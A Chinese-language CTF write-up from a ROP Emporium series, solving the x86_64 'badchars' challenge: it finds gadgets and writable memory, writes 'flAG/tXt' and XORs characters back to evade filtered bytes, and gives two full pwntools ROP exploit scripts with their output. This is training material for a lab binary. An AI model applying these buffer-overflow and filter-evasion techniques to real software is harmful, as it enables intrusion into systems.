---
title: badchars
published: 2026-05-22
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---

# 题目描述

这道题就像上一题，我们仍然需要把目标字符串写入内存并将其作为第一参数调用目标函数，但多了个问题：**坏字符不能直接出现在我们输入的 payload 里，否则会被程序处理/破坏；但我们可以先写入替代字符，再在内存中修回真正的坏字符**

正如题目所写，**二进制文件会在运行时列出其坏字符**，所以到时候我们只需要运行一下就能看到有哪些坏字符了

# 解题流程

## 工具

`pwntools`、`ropper`

## 查反汇编，确定函数地址，找gadgets；readelf确定写入地址

依旧反汇编

```terminal
objdump -d -M intel ./badchars
```

写过两道题相信各位都有感觉，那就是usefulFunction主要还是目标函数的call指令，于我们没什么用，所以我们依旧重点看我们最感兴趣的`目标函数地址`和`usefulGadgets`

```terminal
0000000000400510 <print_file@plt>

0000000000400628 <usefulGadgets>:
  400628:       45 30 37                xor    BYTE PTR [r15],r14b
  40062b:       c3                      ret
  40062c:       45 00 37                add    BYTE PTR [r15],r14b
  40062f:       c3                      ret
  400630:       45 28 37                sub    BYTE PTR [r15],r14b
  400633:       c3                      ret
  400634:       4d 89 65 00             mov    QWORD PTR [r13+0x0],r12
  400638:       c3                      ret
  400639:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
```

发现了不少有趣的指令

```
xor    BYTE PTR [r15],r14b  把r14的值用来和r15里对应地址取一字节的内容作异或运算(修改字符串有奇效)，再写回原地址
mov    QWORD PTR [r13+0x0],r12  依旧是我们熟悉的写入操作(把r12里的8字节写入到r13指向的内存地址，且偏移量为0)
```

大致过程很清晰了：**先看坏字符，再把经过规避坏字符处理的目标字符串用写入操作写入可写段，再用异或运算把目标字符串需要修改的字符修改回来即可**

**还是先看可写段地址**

```terminal
readelf -S -W ./badchars
```

找到：
```terminal
Section Headers:
[Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al #贴心附上表头
[24] .bss              NOBITS          0000000000601038 001038 000008 00  WA  0   0  1
```

这道题`"flag.txt"`正好 8 字节，虽然没有写入`\x00`，但本题环境下可以正常读取，**在更复杂场景中需要额外注意字符串结尾，甚至可能需要分多次写入**

**为了配套使用，我们还得找到对应寄存器的pop指令，以及最后要将目标字符串放入rdi的pop指令**。依旧请出我们的`ropper`

```terminal
ropper --file ./"badchars" --search "pop"
```

找到：

```terminal
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004006a0: pop r14; pop r15; ret;
0x00000000004006a3: pop rdi; ret;
```

显然第一条指令后两个寄存器操作是多余的，并且后续还会用第二条指令将r14、r15的内容改为我们需要的参数，所以我们在写payload时这里可以填两个占位值，反正后面它们仍然会被`pop r14; pop r15`修改掉(最好不要包含坏字符)

如果后续遇到栈对齐问题，再考虑额外的`ret`，本题这里不需要

**最后，运行一下文件，看`坏字符`**

```terminal
./badchars

badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
>
```

既然如此，不妨我们在写入时用**"flAG/tXt"**

以"A"为例，我们在将其写入后，通过异或运算，可以将其转化为小写

```
A=65     对应二进制01000001
0x20=32  对应二进制00100000
将两者的各位作异或运算(相同为0，不同为1)
易知结果为01100001，对应为小写字母a
其余字母和符号同理，就不一一列举

另
大写字母A~Z：0x41~0x5a 对应二进制01xx xxxx
小写字母a~z：0x61~0x7a 对应二进制011x xxxx
大小写的唯一差别就是从右往左第六位，这一位正好和0x20作异或运算就可以来回翻转
达到大小写变换的效果！！！
```

规范字符串、目标函数和gadgets都找的差不多了，开始写脚本

## 构造exp脚本

根据我们的思路，脚本如下：

```py
from pwn import *

p = process('./badchars')
p.recv() 

payload = b'A' * 40 + p64(0x000000000040069c) + b"flAG/tXt" + p64(0x0000000000601038) + p64(0x00000000000000aa) + p64(0x00000000000000aa) + p64(0x0000000000400634) +p64(0x00000000004006a0) + p64(0x20) + p64(0x000000000060103a) + p64(0x400628) + p64(0x00000000004006a0) + p64(0x20) + p64(0x000000000060103b) + p64(0x400628) + p64(0x00000000004006a0) + p64(0x01) + p64(0x000000000060103c) + p64(0x400628) + p64(0x00000000004006a0) + p64(0x20) +p64(0x000000000060103e) + p64(0x400628) + p64(0x00000000004006a3) + p64(0x0000000000601038) + p64(0x0000000000400510)
#从左到右依次是pop r12; pop r13; pop r14; pop r15; ret;   规避坏字符的字符串  .bss地址   随便的两个地址  写入操作   后面大概是几组pop r14; pop r15; ret; + 异或值 + 对应修改字符地址 + 异或修改操作    收尾工作pop rdi;ret;  .bss地址  print_file@plt地址

p.sendline(payload)
p.interactive()
```

优化后的易读版本(AIGC):

```python
from pwn import *

p = process('./badchars')
p.recv()

offset = 40

# 可写内存
bss = 0x601038

# gadgets
pop_r12_r13_r14_r15_ret = 0x40069c
pop_r14_r15_ret = 0x4006a0
pop_rdi_ret = 0x4006a3

mov_ptr_r13_r12_ret = 0x400634
xor_ptr_r15_r14b_ret = 0x400628

# 目标函数
print_file_plt = 0x400510

payload = b'A' * offset

# 1. 写入规避坏字符后的字符串：flAG/tXt
payload += p64(pop_r12_r13_r14_r15_ret)
payload += b"flAG/tXt"          # r12 = 要写入的 8 字节
payload += p64(bss)             # r13 = 写入地址
payload += p64(0xdeadbeef)      # r14 占位
payload += p64(0xcafebabe)      # r15 占位
payload += p64(mov_ptr_r13_r12_ret)

# 2. 修复 A -> a
payload += p64(pop_r14_r15_ret)
payload += p64(0x20)            # r14b = 0x20
payload += p64(bss + 2)         # 指向 A 的位置
payload += p64(xor_ptr_r15_r14b_ret)

# 3. 修复 G -> g
payload += p64(pop_r14_r15_ret)
payload += p64(0x20)
payload += p64(bss + 3)
payload += p64(xor_ptr_r15_r14b_ret)

# 4. 修复 / -> .
payload += p64(pop_r14_r15_ret)
payload += p64(0x01)
payload += p64(bss + 4)
payload += p64(xor_ptr_r15_r14b_ret)

# 5. 修复 X -> x
payload += p64(pop_r14_r15_ret)
payload += p64(0x20)
payload += p64(bss + 6)
payload += p64(xor_ptr_r15_r14b_ret)

# 6. 调用 print_file("flag.txt")
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(print_file_plt)

p.sendline(payload)
p.interactive()
```

跑一下，会发生什么呢

```python
python3 badchars.py

[+] Starting local process './badchars': pid 92509
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
```

flag出来了（＾－＾）

# 总结

+ 做这道题的核心思想便是确定坏字符，不要直接写入，而是将其根据坏字符作规范处理后再写入，最后用按位异或运算改回我们的目标字符串。ps：可用大小写替换，方便改回来（如果是字母）

+ `XOR`是按位异或，别和按位或搞混了！

+ `XOR`在不少情况下是可逆的（比如大小写变换，`OR`则不行）
